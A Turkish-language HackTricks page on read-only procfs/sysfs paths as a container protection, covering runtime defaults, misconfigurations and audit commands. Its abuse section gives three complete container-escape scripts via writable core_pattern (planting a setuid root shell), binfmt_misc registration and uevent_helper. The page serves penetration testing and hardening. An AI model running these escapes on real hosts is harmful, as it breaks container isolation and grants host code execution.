# Salt Okunur Sistem Yolları

{{#include ../../../../banners/hacktricks-training.md}}

Salt okunur sistem yolları, maskelenmiş yollardan ayrı bir korumadır. Bir yolu tamamen gizlemek yerine runtime bu yolu görünür tutar, ancak salt okunur olarak mount eder. Bu, okuma erişiminin kabul edilebilir veya operasyonel olarak gerekli olabileceği, ancak yazma işlemlerinin fazla tehlikeli olacağı seçili procfs ve sysfs konumlarında yaygındır.

Amaç basittir: birçok kernel arayüzü yazılabilir olduklarında çok daha tehlikeli hale gelir. Salt okunur bir mount, tüm reconnaissance değerini ortadan kaldırmaz, ancak ele geçirilmiş bir workload'un bu yol üzerinden temel kernel-facing dosyaları değiştirmesini engeller.

## Operation

Runtime'lar proc/sys görünümünün bazı bölümlerini sıklıkla salt okunur olarak işaretler. Runtime'a ve host'a bağlı olarak bu, aşağıdaki gibi yolları içerebilir:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Gerçek liste değişiklik gösterir, ancak model aynıdır: gerektiğinde görünürlüğe izin ver, varsayılan olarak değişikliği reddet.<sup>[[1]](#references)</sup>

## Lab

Docker tarafından tanımlanan salt okunur yol listesini inceleyin:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Container içinden mount edilmiş proc/sys görünümünü inceleyin:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Güvenlik Etkisi

Salt okunur sistem yolları, host'u etkileyen geniş bir kötüye kullanım sınıfını daraltır. Bir attacker procfs veya sysfs'yi inceleyebilse bile, bu alanlara yazamamak kernel tunable'ları, crash handler'ları, module-loading helper'larını veya diğer control interface'lerini içeren birçok doğrudan değiştirme yolunu ortadan kaldırır. Exposure tamamen ortadan kalkmaz, ancak information disclosure'dan host üzerinde etki oluşturmaya geçiş zorlaşır.

## Yanlış Yapılandırmalar

Başlıca hatalar; hassas yolların maskesini kaldırmak veya yeniden read-write olarak mount etmek, host proc/sys içeriğini doğrudan yazılabilir bind mount'larla açığa çıkarmak ya da daha güvenli runtime varsayılanlarını fiilen atlayan privileged mode'lar kullanmaktır. Kubernetes'te `procMount: Unmasked` ve privileged workload'lar genellikle daha zayıf proc protection ile birlikte görülür.<sup>[[2]](#references)</sup> Diğer yaygın bir operasyonel hata da runtime bu yolları genellikle read-only olarak mount ettiği için tüm workload'ların hâlâ bu varsayılanı devraldığını varsaymaktır.

## Kötüye Kullanım

Protection zayıfsa, yazılabilir proc/sys entry'lerini arayarak başlayın:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Yazılabilir girdiler mevcut olduğunda, yüksek değerli takip yolları şunları içerir:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Bu komutların ortaya çıkarabilecekleri:

- `/proc/sys` altındaki yazılabilir girdiler, container'ın yalnızca inceleme yapmakla kalmayıp host kernel davranışını değiştirebildiği anlamına gelir.
- `core_pattern` özellikle önemlidir; çünkü yazılabilir bir host-facing değer, pipe handler ayarlandıktan sonra bir process'i çökerterek host üzerinde code execution yoluna dönüştürülebilir.
- `modprobe`, kernel tarafından module-loading ile ilgili akışlarda kullanılan helper'ı ortaya çıkarır; yazılabilir olduğunda klasik ve yüksek değerli bir hedeftir.
- `binfmt_misc`, custom interpreter registration işleminin mümkün olup olmadığını gösterir. Registration yazılabilirse bu, yalnızca bir information leak olmak yerine bir execution primitive'e dönüşebilir.
- `panic_on_oom`, host genelinde geçerli bir kernel kararını kontrol eder ve bu nedenle resource exhaustion'ı host denial of service durumuna dönüştürebilir.
- `uevent_helper`, yazılabilir bir sysfs helper path'inin host context'inde execution üretmesine ilişkin en açık örneklerden biridir.

İlgi çekici bulgular arasında, normalde read-only olması gereken yazılabilir host-facing proc knob'ları veya sysfs girdileri yer alır. Bu noktada workload, kısıtlanmış bir container görünümünden anlamlı kernel etkisine doğru ilerlemiştir.

### Full Example: `core_pattern` Host Escape

`/proc/sys/kernel/core_pattern` container içinden yazılabilir durumdaysa ve host kernel görünümüne işaret ediyorsa, bir crash sonrasında payload execute etmek için abuse edilebilir:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
If path gerçekten host kernel'e ulaşıyorsa, payload host üzerinde çalışır ve geride bir setuid shell bırakır.

### Tam Örnek: `binfmt_misc` Registration

`/proc/sys/fs/binfmt_misc/register` yazılabilir durumdaysa, özel bir interpreter registration eşleşen dosya çalıştırıldığında code execution sağlayabilir:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Host'a bakan yazılabilir bir `binfmt_misc` üzerinde sonuç, kernel tarafından tetiklenen interpreter yolunda code execution elde edilmesidir.

### Tam Örnek: `uevent_helper`

`/sys/kernel/uevent_helper` yazılabilirse kernel, eşleşen bir event tetiklendiğinde host-path helper'ını çağırabilir:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Bunun bu kadar tehlikeli olmasının nedeni, helper path'in güvenli ve yalnızca container bağlamı yerine host filesystem perspektifinden çözümlenmesidir.

## Kontroller

Bu kontroller, procfs/sysfs exposure'ın beklenen yerlerde read-only olup olmadığını ve workload'un hassas kernel interface'lerini hâlâ değiştirip değiştiremediğini belirler.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Burada dikkat çekici olanlar:

- Normal şekilde harden edilmiş bir workload, çok az sayıda yazılabilir proc/sys girdisi sunmalıdır.
- Yazılabilir `/proc/sys` yolları, sıradan read erişiminden genellikle daha önemlidir.
- Runtime bir yolu read-only olarak bildiriyor ancak yol pratikte yazılabilir durumdaysa mount propagation, bind mounts ve privilege ayarlarını dikkatlice inceleyin.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin | Docker, hassas proc girdileri için varsayılan bir read-only path listesi tanımlar | host proc/sys mount'larını açığa çıkarmak, `--privileged` |
| Podman | Varsayılan olarak etkin | Podman, açıkça gevşetilmediği sürece varsayılan read-only paths uygular | `--security-opt unmask=ALL`, geniş host mount'ları, `--privileged` |
| Kubernetes | Runtime varsayılanlarını devralır | Pod ayarları veya host mount'ları ile zayıflatılmadığı sürece temel runtime'ın read-only path modelini kullanır | `procMount: Unmasked`, privileged workload'lar, yazılabilir host proc/sys mount'ları |
| containerd / CRI-O under Kubernetes | Runtime varsayılanı | Genellikle OCI/runtime varsayılanlarına dayanır | Kubernetes satırındakiyle aynı; doğrudan runtime yapılandırma değişiklikleri davranışı zayıflatabilir |

Temel nokta, read-only system paths'in genellikle bir runtime varsayılanı olarak mevcut olması, ancak privileged modlar veya host bind mount'ları ile kolayca etkisiz hâle getirilebilmesidir.

## Referanslar

- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Kubernetes API Reference: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
